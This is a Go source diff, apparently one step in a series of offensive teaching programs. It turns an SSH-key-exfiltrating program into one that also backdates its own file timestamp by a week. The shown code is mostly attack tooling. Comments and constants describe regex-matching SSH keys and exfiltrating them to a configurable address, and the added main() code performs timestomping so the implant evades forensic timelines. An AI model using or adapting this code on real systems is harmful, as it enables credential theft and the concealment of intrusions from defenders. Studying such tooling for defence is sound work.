@@ -1,0 +1,47 @@
+--- ../map_and_regex_file_descriptor/map_and_regex_file_descriptor.go	Sat Sep  7 18:45:54 2024
++++ change_own_timestamp.go	Sat Sep  7 18:45:54 2024
+@@ -1,10 +1,10 @@
+-// Program map_and_regex_file_descriptor - read_from_file_descriptor but maps
+-// the file into memory and exfills regex matches
++// Program change_own_timestamp - map_and_regex_file_descriptor but changes
++// argv[0]'s timestamp to a week earlier.
+ package main
+ 
+ /*
+- * map_and_regex_file_descriptor.go
+- * read_from_file_descriptor but with mmap and regex
++ * change_own_timestamp.go
++ * map_and_regex_file_descriptor with timestomping
+  * By J. Stuart McMurray
+  * Created 20240907
+  * Last Modified 20240907
+@@ -23,6 +23,7 @@
+ 	"os/exec"
+ 	"regexp"
+ 	"syscall"
++	"time"
+ )
+ 
+ // Compile-time configurables
+@@ -39,6 +40,8 @@
+ 	FileFD = 8
+ 	// MaxKeys is the maximum number of key's we'll exfil.
+ 	MaxKeys = 1024
++	// TimestampOffset is how long from now to set argv[0]'s timestamp.
++	TimestampOffset = -168 * time.Hour
+ )
+ 
+ // KeyRE finds us an SSH key, hopefully without too much fuss.
+@@ -52,6 +55,12 @@
+ )
+ 
+ func main() {
++	/* Change our own timestamp to some time in the past. */
++	when := time.Now().Add(TimestampOffset)
++	if err := os.Chtimes(os.Args[0], when, when); nil != err {
++		log.Printf("Could not change our own timestamp: %s", err)
++	}
++
+ 	/* Config from environment overrides compile-time config. */
+ 	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
+ 
